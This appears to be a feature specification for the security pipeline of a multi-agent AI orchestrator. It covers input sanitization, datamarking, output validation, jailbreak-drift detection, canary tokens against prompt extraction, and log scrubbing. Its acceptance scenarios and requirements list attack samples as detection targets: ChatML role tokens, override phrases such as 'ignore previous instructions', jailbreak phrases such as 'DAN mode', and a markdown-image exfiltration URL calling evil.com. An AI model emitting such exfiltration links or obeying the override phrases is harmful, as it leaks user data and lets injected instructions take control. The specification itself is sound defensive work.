# Feature Specification: AI Security Pipeline

**Feature Branch**: `007-ai-security-pipeline`
**Created**: 2026-04-12
**Status**: Draft
**Input**: User description: "AI security pipeline — spotlighting, sanitization, output validation, jailbreak detection, prompt extraction defense, exfiltration filtering, log scrubbing"

## Clarifications

### Session 2026-04-14

- Q: Same-speaker exception for datamarking? → A: Exempt same-speaker AI messages from datamarking (no trust boundary to enforce when reading own output); matches PR #47 shipped code
- Q: Prompt extraction detection unit? → A: 25 words (whitespace split, no tokenizer dependency)

## User Scenarios & Testing *(mandatory)*

### User Story 1 - Context Sanitization (Priority: P1)

Before any message enters the context assembly pipeline, the system strips known injection patterns: ChatML tokens, role markers, override phrases, HTML comments, and invisible Unicode characters. This prevents one AI's output from containing instructions that could manipulate another AI when included in its context.

**Why this priority**: Sanitization is the first line of defense. Without it, raw injection payloads pass directly into other models' context windows.

**Independent Test**: Can be tested by providing messages containing known injection patterns and verifying they are stripped before context assembly.

**Acceptance Scenarios**:

1. **Given** a message containing ChatML tokens (`<|im_start|>system`), **When** it is sanitized, **Then** the tokens are removed and the remaining content is preserved.
2. **Given** a message containing override phrases ("ignore previous instructions"), **When** it is sanitized, **Then** the phrases are removed.
3. **Given** a message containing invisible Unicode characters (zero-width spaces, RTL overrides), **When** it is sanitized, **Then** the invisible characters are stripped.
4. **Given** a clean message with no injection patterns, **When** it is sanitized, **Then** the content is returned unchanged.

---

### User Story 2 - Inter-Agent Spotlighting (Priority: P1)

When an AI's response is included in another AI's context, the system applies datamarking — inserting unique markers between words that make it structurally clear the content is data (another agent's output), not instructions. This disrupts instruction injection propagation between agents.

**Why this priority**: Spotlighting is the primary defense against cross-agent injection. Research shows it reduces attack success from ~50% to 2-8%.

**Independent Test**: Can be tested by spotlighting a message and verifying the output contains datamarks, then verifying the original content can be reconstructed.

**Acceptance Scenarios**:

1. **Given** an AI response from participant A, **When** it is included in participant B's context, **Then** the content is datamarked with participant A's identifier.
2. **Given** a datamarked message, **When** it is read, **Then** the original content is still comprehensible to the receiving AI.
3. **Given** a human interjection, **When** context is assembled, **Then** it is NOT datamarked (human content is higher trust).
4. **Given** a system message, **When** context is assembled, **Then** it is NOT datamarked (system content is highest trust).

---

### User Story 3 - Output Validation (Priority: P1)

Every AI response passes through a validation pipeline before entering the conversation history. The pipeline checks for injection markers, suspicious patterns, and structural anomalies. Responses that fail validation are flagged and held for facilitator review rather than being silently passed through.

**Why this priority**: Output validation catches attacks that bypass sanitization — it's the defense-in-depth layer that inspects what the AI actually produced.

**Independent Test**: Can be tested by providing responses with known attack patterns and verifying they are flagged and blocked.

**Acceptance Scenarios**:

1. **Given** a response containing injection markers (role labels, ChatML tokens), **When** it is validated, **Then** it is flagged with a risk score.
2. **Given** a response with a high risk score, **When** validation completes, **Then** it is held for facilitator review instead of entering the transcript.
3. **Given** a clean response, **When** it is validated, **Then** it passes and enters the transcript normally.
4. **Given** a flagged response, **When** it is held, **Then** the original content, risk score, and detection reason are preserved for review.

---

### User Story 4 - Exfiltration Filtering (Priority: P2)

The system detects and blocks data exfiltration attempts in AI responses: markdown image syntax that could leak data via URLs, suspicious URL patterns with embedded data, and credential patterns (API keys, JWTs). Detected patterns are stripped from the response before it enters the transcript.

**Why this priority**: Exfiltration is a real attack vector where an AI embeds sensitive data in URLs or images that get rendered by a client, leaking the data to an external server.

**Independent Test**: Can be tested by providing responses with markdown images, data-embedding URLs, and credential-like strings and verifying they are stripped.

**Acceptance Scenarios**:

1. **Given** a response containing `![img](https://evil.com/steal?data=secret)`, **When** it is filtered, **Then** the markdown image syntax is stripped.
2. **Given** a response containing a URL with `token=` or `secret=` query parameters, **When** it is filtered, **Then** the URL is flagged.
3. **Given** a response containing an API key pattern (`sk-...`), **When** it is filtered, **Then** the credential is redacted.
4. **Given** a response with normal URLs and no exfiltration patterns, **When** it is filtered, **Then** the content is unchanged.

---

### User Story 5 - Jailbreak Propagation Detection (Priority: P2)

The system monitors AI responses for behavioral drift that may indicate jailbreak propagation: responses that are dramatically longer or shorter than the participant's average, responses that reference non-existent participants, meta-commentary about instructions, or known jailbreak phrases. Flagged responses are held for review.

**Why this priority**: Jailbreak detection catches sophisticated attacks that don't use obvious injection patterns but manipulate the AI's behavior through the conversation itself.

**Independent Test**: Can be tested by providing responses with known drift indicators and verifying they are flagged.

**Acceptance Scenarios**:

1. **Given** a response >3x longer than the participant's rolling average (LENGTH_DEVIATION_FACTOR), **When** drift is checked, **Then** it is flagged as anomalous.
2. **Given** a response containing "I'm now operating in unrestricted mode", **When** drift is checked, **Then** it is flagged.
3. **Given** a response that addresses a participant name not in the session, **When** drift is checked, **Then** it is flagged.
4. **Given** a normal response within expected parameters, **When** drift is checked, **Then** it passes without flags.

---

### User Story 6 - System Prompt Extraction Defense (Priority: P2)

The system embeds canary tokens in system prompts and scans AI responses for leakage. If a response contains a canary token or a substantial fragment (20+ tokens) of any participant's system prompt, it is flagged. This detects prompt extraction attacks where an AI is tricked into revealing its instructions.

**Why this priority**: System prompts contain collaboration rules and potentially sensitive configuration. Leakage undermines the entire trust model.

**Independent Test**: Can be tested by providing responses that contain canary tokens or prompt fragments and verifying they are detected.

**Acceptance Scenarios**:

1. **Given** a response containing an embedded canary token, **When** extraction defense runs, **Then** the leakage is detected.
2. **Given** a response containing a 25-word substring of a system prompt, **When** extraction defense runs, **Then** it is flagged.
3. **Given** a response that does not contain any prompt material, **When** extraction defense runs, **Then** it passes.

---

### User Story 7 - Log Scrubbing (Priority: P3)

All log output is scrubbed for credential patterns before emission. API keys, auth tokens, encryption keys, and JWT tokens are redacted to prevent accidental credential exposure in logs, error traces, or debug output.

**Why this priority**: Defense-in-depth for credential protection. Constitution §9 requires secrets never appear in logs.

**Independent Test**: Can be tested by logging messages containing credential patterns and verifying they are redacted in the output.

**Acceptance Scenarios**:

1. **Given** a log message containing an API key pattern (`sk-ant-...`), **When** it is scrubbed, **Then** the key is replaced with `[REDACTED]`.
2. **Given** a log message containing a JWT (`eyJ...`), **When** it is scrubbed, **Then** the token is replaced with `[REDACTED]`.
3. **Given** a log message with no credentials, **When** it is scrubbed, **Then** the content is unchanged.

---

### Edge Cases

- What happens when sanitization strips so much content that the message becomes empty? The empty message is logged as stripped and skipped — it does not enter the transcript.
- What happens when spotlighting makes a response too long for the token budget? The budget enforcement in context assembly handles truncation — spotlighting overhead is accounted for in token estimation.
- What happens when the output validator flags a legitimate response as suspicious? It's held for facilitator review. False positives are resolved by human judgment — the system never silently blocks.
- What happens when log scrubbing encounters a novel credential format? Known patterns are redacted; unknown patterns pass through. The pattern list is extensible.

## Requirements *(mandatory)*

### Functional Requirements

- **FR-001**: System MUST strip injection patterns from all messages before context assembly. The canonical pattern set lives in `src/security/sanitizer.py` and currently covers: ChatML / role-marker syntaxes (`<|im_start|>`, `system:` / `assistant:` / `user:` line prefixes), Llama instruction markers (`[INST]` / `[/INST]`), HTML comments, override phrases (`ignore/disregard/forget the previous instructions`), instruction-injection prefixes (`new/updated/revised instructions:`), reset triggers (`from now on`), and invisible Unicode (zero-width spaces, RTL/LTR overrides, BOM). The list is open-ended: new patterns are added to the canonical file as attacks surface. Sanitization runs AFTER NFKC normalization and a mixed-script homoglyph fold (Cyrillic/Greek lookalikes -> Latin in words that mix scripts) so injection attempts that obfuscate ASCII via Unicode tricks still hit the regexes.
- **FR-002**: System MUST apply datamarking to AI responses before inclusion in another AI's context. The marker format is `^<6-hex-prefix>^<word>` per whitespace-split word, where `<6-hex-prefix>` is the first 6 characters of the SHA-256 of the source participant id (canonical implementation: `src/security/spotlighting.py`).
- **FR-003**: System MUST NOT datamark human interjections, system messages, or AI messages from the same speaker as the current participant (an AI reading its own prior output has no trust boundary to enforce).
- **FR-004**: System MUST validate every AI response against injection pattern checks before persistence.
- **FR-005**: System MUST hold responses with high risk scores (>=0.7 in `src/security/output_validator.py`) for facilitator review instead of persisting them. On facilitator approve / edit, the resolved content is persisted verbatim — it does NOT re-enter the security pipeline. Operator authority overrides defenses by design; the audit log captures the original draft, the edit (if any), and the resolution.
- **FR-006**: System MUST strip markdown image syntax and HTML src attributes from AI responses.
- **FR-007**: System MUST flag URLs with data-embedding query parameters in AI responses. Currently matched parameter names: `data`, `token`, `secret`, `key`, `password`. Canonical regex in `src/security/exfiltration.py`. Extend the list as new exfiltration vectors surface.
- **FR-008**: System MUST detect and redact credential patterns in AI responses. Coverage: OpenAI (`sk-...`), Anthropic (`sk-ant-...`), Gemini (`AIza...`), Groq (`gsk_...`), JWTs (`eyJ...`), and Fernet tokens (`gAAAAA...`). New supported providers MUST add their key prefix here.
- **FR-009**: System MUST monitor responses for behavioral drift indicators and flag anomalies. Current heuristics: response length >3x the participant's rolling average (LENGTH_DEVIATION_FACTOR), and known jailbreak-phrase matches (`DAN mode`, `developer mode`, `unrestricted mode`, `jailbreak(ed)`, `as an AI language model without`, etc. — canonical list in `src/security/jailbreak.py`). Cold-start (insufficient history → avg_length <= 0) skips the length-deviation check; phrase matching always runs.
- **FR-010**: System MUST embed three random 16-char base32 canary tokens in system prompts and scan responses for leakage. Multi-canary (vs single) is required per constitution §8 amendment — single-canary is insufficient because a single match disclosure reveals the canary structure, while three independent canaries make pattern-leak triangulation harder.
- **FR-011**: System MUST scan responses for substantial fragments (25+ words, whitespace-split) of any participant's assembled system prompt (Tier 1+2+3+4 as composed at dispatch time). No tokenizer dependency — simple word count by whitespace split. Cross-participant fragment overlap (when two participants share boilerplate) is accepted residual risk; in practice, system prompts differ enough.
- **FR-012**: System MUST redact credential patterns in all log output AND in unhandled-exception tracebacks before emission. Coverage matches FR-008 (OpenAI, Anthropic, Gemini, Groq, JWT, Fernet) plus a generic `(api_key|token|secret)\s*[=:]\s*VALUE` catch-all. Implementation hooks both the root logger filter and `sys.excepthook` at app startup (`src/run_apps.py`).
- **FR-013**: System MUST never silently drop or block an AI response — blocked responses are always held for review with the original content preserved. Pipeline-internal failures (regex bug, unicode error, etc.) fail closed: the turn is skipped with reason=`security_pipeline_error` and the participant is NOT penalized via the circuit breaker (the failure is ours, not theirs).
- **FR-014**: Layer evaluation order is fixed: validate -> exfiltration filter (-> jailbreak/prompt-protector when wired). Each layer emits independent flags / findings / reasons. Blocking decision is `max(risk_score)` across layers crossing the high-risk threshold; flag accumulation across layers is preserved for audit.
- **FR-015**: System MUST persist per-layer detection records to `security_events` for post-hoc review. Schema: `(session_id, speaker_id, turn_number, layer, risk_score, findings, blocked, timestamp)` where `findings` is a JSON-encoded list of finding/flag/reason names. `layer` is one of `output_validator` / `exfiltration` / `jailbreak` / `prompt_protector` / `pipeline_error`. Events are exposed via `GET /tools/debug/export` under `logs.security_events`.
- **FR-016**: System MUST notify the facilitator when the pipeline holds a response. Notification surfaces (Phase 1+2): (a) the review-gate UI banner that appears on routing-mode transition to `review`, (b) the `security_events` row written by FR-015 (with `blocked=True`), and (c) the WS `routing_mode` event that flips seated facilitators' UI into review state. Held responses are never silently queued.
- **FR-017**: Pattern lists in `src/security/` (sanitizer, exfiltration, jailbreak, output_validator, scrubber, prompt_protector) are the canonical source of truth. New attack patterns surfaced in shakedowns, red-team exercises, or production incidents MUST be added to the relevant module within one PR cycle, with the originating incident referenced in the commit message and (when applicable) `docs/red-team-runbook.md`. Pattern modules SHOULD be reviewed at the start of each phase to prune obsolete entries and confirm coverage of newly supported providers.
- **FR-018**: Auto-block, auto-mute, and per-participant threshold tightening are explicitly out of scope. Repeat-offender response requires a facilitator decision via the review-gate UI. The system surfaces per-participant held-response counts via `security_events` (queryable by `(session_id, speaker_id)`) but does not act on them. Operator-level escalation (suspending a participant, ending a session) is a facilitator action, not a pipeline action. Automated escalation is deferred to a future phase.
- **FR-019**: Phase 1 false-positive targets per layer, measured against a benign-corpus fixture (`tests/fixtures/benign_corpus.txt`, TBD): `output_validator` <2%, `exfiltration` <1%, `jailbreak` <8% (drift detector dominates), `prompt_protector` <0.5%. Targets are advisory until the fixture lands; the drift detector's `LENGTH_DEVIATION_FACTOR` is the primary tuning knob if `jailbreak` exceeds budget.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: Known injection patterns are stripped 100% of the time, where "known" is defined by the canonical pattern set in `src/security/sanitizer.py` at the spec revision in effect (per FR-017 maintenance). Adding a new pattern updates the SC-001 surface; removing one requires a Phase-level review.
- **SC-002**: AI responses are datamarked before cross-agent context injection 100% of the time.
- **SC-003**: Responses containing injection markers are flagged with risk_score >= 0.7 (the block threshold) and held for facilitator review.
- **SC-004**: Credential patterns never appear in log output.
- **SC-005**: Markdown image exfiltration patterns are stripped from AI responses.
- **SC-006**: Canary token leakage is detected within the same turn. (Pipeline runs synchronously after dispatch with a <50ms target; the 180s default turn timeout makes this trivially holdable.)
- **SC-007**: Every AI response on a non-test code path passes through the security pipeline. Direct DB inserts, debug routes, and test fixtures are out of scope; production dispatch flows through `_validate_and_persist`.

## Assumptions

- LLM-as-judge validation layer is deferred — pattern matching and semantic checks are sufficient for Phase 1. The interface contract is pinned by `src/security/llm_judge.py` (NoOpJudge default) so a future implementation slots in without rewiring callers.
- Cross-model safety profiling (per-model trust tiers) is deferred to a future feature.
- Spotlighting uses the datamark method (word-level markers). Delimiter and encoding methods are alternatives for future experimentation.
- Log scrubbing applies to Python logging output via the root-logger ScrubFilter. Loggers that disable propagation to root bypass scrubbing — out of scope for Phase 1. Traceback scrubbing (sys.excepthook override) is included.
- The security pipeline runs synchronously in the turn loop — it must complete before persistence. Performance target: <50ms for the full pipeline excluding LLM-as-judge, measured as wall-clock time inside `_validate_and_persist` per AI dispatch on representative production hardware (orchestrator container, Postgres on same host or low-latency LAN). The target is observational only — no test enforces it; if regressions surface, add per-layer timing logs first, then a benchmark fixture.
- Jailbreak detection uses simple heuristics (length deviation, phrase matching). ML-based detection is a future enhancement.
- Repeat-offender escalation (per-participant threshold tightening) is out of scope for Phase 1. Each turn is evaluated independently.
- Operator runtime bypass of pipeline layers is not supported — the pipeline always runs on AI dispatch paths. Pen-testing / red-team work uses test fixtures, not runtime overrides.
- Per-layer performance budget is not specified; only the aggregate <50ms target. Add per-layer instrumentation if regressions surface.
- **Re-evaluation triggers** (when the assumptions "pattern matching is sufficient" and "jailbreak heuristics are sufficient" must be revisited): (a) >=3 confirmed pattern-bypass incidents (post-hoc reclassified `security_events` rows where `blocked=False` should have been `True`) in any rolling 90-day window; (b) per-call cost of an LLM judge drops below ~$0.001/evaluation at projected production volume; (c) any non-shakedown attack succeeds in production; (d) drift detector false-positive rate exceeds the FR-019 budget on the benign-corpus fixture for two consecutive measurement cycles. Hitting any trigger opens an issue scoped to "promote LLM-judge from stub to active layer" or "tune jailbreak thresholds", as appropriate.

## Threat model traceability

Each functional requirement traces to a section of `docs/AI_attack_surface_analysis_for_SACP_orchestrator.md` and to standard threat catalogs (OWASP LLM Top 10 2025, NIST AI 100-2, NIST SP 800-53):

| FR | Defends against | Attack-surface doc | OWASP LLM | NIST AI 100-2 / SP 800-53 |
|----|-----------------|--------------------|-----------|---------------------------|
| FR-001 (sanitization) | Indirect prompt injection, ChatML/role-marker spoofing | §1, §11 | LLM01 | AI 100-2 §3.4; SP 800-53 SI-3, AC-4 |
| FR-002, FR-003 (spotlighting) | Cross-agent injection propagation | §1 | LLM01 | AI 100-2 §3.4; SP 800-53 AC-4 |
| FR-004, FR-005 (output validation) | Output-side injection markers, instruction leakage | §1, §11 | LLM01, LLM05 | AI 100-2 §3.4; SP 800-53 SI-15 |
| FR-006, FR-007 (image/URL strip + flag) | Markdown-image and URL exfiltration vectors | §6 | LLM02, LLM06 | SP 800-53 SI-15, SC-7 |
| FR-008 (credential redaction in responses) | API-key exfiltration via AI output | §4, §6 | LLM02, LLM06 | SP 800-53 IA-5, SC-28 |
| FR-009 (jailbreak / drift detection) | Jailbreak propagation, multi-turn escalation | §2, §11 | LLM01, LLM07 | AI 100-2 §3.4.4; SP 800-53 SI-4 |
| FR-010, FR-011 (canary + fragment scan) | System-prompt extraction | §3 | LLM07 | SP 800-53 SI-15, SC-28 |
| FR-012 (log scrubbing + excepthook) | Credential leakage in logs/tracebacks | §4 | LLM02 | SP 800-53 IA-5, SC-12, AU-9 |
| FR-013 (no silent drop, fail-closed) | Defense erosion via silent bypass | §11 | LLM05 | SP 800-53 SI-4, AU-2 |
| FR-014 (layer precedence) | Audit-attribution ambiguity across layers | §11 | LLM05 | SP 800-53 AU-2, AU-12 |
| FR-015 (security_events persistence) | Forensic blind spots after a held turn | §11 | LLM05 | SP 800-53 AU-2, AU-3, AU-12 |
| FR-016 (operator notification) | Held-response queue invisibility | §11 | LLM05 | SP 800-53 IR-6, AU-6 |
| FR-017 (pattern-list maintenance) | Pattern-list staleness as new attacks emerge | §1, §2 | LLM01 | SP 800-53 RA-3, RA-5 |
| FR-018 (incident response scope) | Premature automation of facilitator decisions | §11 | LLM05 | SP 800-53 IR-4, IR-6 |
| FR-019 (FPR targets per layer) | Operator alert fatigue | §11 | LLM05 | SP 800-53 SI-4(11) |

## Audit closeout (2026-04-29)

The security-requirements quality audit (`checklists/security.md`) raised 33 findings; all 33 are addressed by this spec or by code in `src/security/`. The closeout split:

**Code changes**: CHK002 (Gemini/Groq patterns), CHK008 (security_events table), CHK025 (fail-closed pipeline), CHK026 (NFKC + Cyrillic/Greek homoglyph fold), CHK029 (credential-placeholder allowlist), CHK039 (LLM-judge interface stub), CHK044 (excepthook scrubbing).

**Spec amendments**: CHK001 (FR-001 sanitizer enumeration), CHK003 (FR-007 URL params), CHK004 (FR-009 jailbreak phrases), CHK005 (FR-016 notification path), CHK006 (FR-017 pattern maintenance), CHK007 (FR-018 incident-response scope), CHK009 (FR-002 datamark format pinned), CHK010 (FR-005 quantified threshold), CHK011 (FR-009 LENGTH_DEVIATION_FACTOR), CHK012 (FR-010 canary shape), CHK013 (Assumptions perf measurement methodology), CHK016 (FR-008/FR-012 coverage parity), CHK018/CHK042 (FR-010 multi-canary), CHK020 (SC-003 quantified), CHK021 (SC-001 references canonical pattern set), CHK022 (SC-006 timing note), CHK023 (FR-019 FPR targets), CHK024 (FR-005 review-gate persists verbatim), CHK027 (FR-014 precedence), CHK033 (Threat-model traceability table), CHK037/CHK038 (Assumptions re-evaluation triggers), CHK041 (FR-001 broadened beyond ChatML), CHK043 (FR-011 tier scope).

**Closed as out-of-scope / accepted residual** (documented in Assumptions or Edge Cases): CHK014 (novel credential format pass-through), CHK017 (per-id same-speaker exemption is correct on re-inspection), CHK019 (markdown-image dual layer), CHK028 (no per-participant tightening), CHK030 (cross-participant fragment overlap), CHK031 (no runtime bypass), CHK032 (cold-start drift skip), CHK034 (no per-layer perf budget), CHK035 (SC-007 covers production paths), CHK036 (a11y deferred to Phase 3), CHK040 (root-logger propagation scope).

## Topology and Use Case Coverage (V12/V13 retro-addendum, 2026-04-15)

**Topologies** (per constitution §3): All seven (1–7). Sanitization, spotlighting, output validation, jailbreak detection, and exfiltration filtering apply uniformly whether the orchestrator or peers dispatch turns. Cross-agent injection attacks exist in any topology where one AI's output becomes another's input — the defenses are topology-agnostic.

**Use cases** (per constitution §1): Foundational for high-stakes scenarios — technical audits, zero-trust cross-org, and asymmetric expertise pairings — where intentional or accidental prompt injection could undermine collaboration integrity.
